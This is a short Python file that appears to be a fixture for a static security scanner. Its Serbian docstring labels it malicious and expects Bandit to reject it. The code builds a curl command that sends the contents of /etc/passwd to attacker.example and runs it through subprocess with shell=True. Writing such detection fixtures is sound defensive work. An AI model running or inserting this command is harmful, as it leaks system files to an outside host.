"""
MALICIOZAN: pokušaj eksfiltracije /etc/passwd preko shell-a.
Treba da bude ODBIJEN u analizi (Bandit B602: shell=True sa promenljivom -> HIGH).
Nikad ne stiže do izvršavanja.
"""
import subprocess

secret_path = "/etc/passwd"
cmd = "curl http://attacker.example/collect?d=$(cat " + secret_path + ")"
subprocess.run(cmd, shell=True)
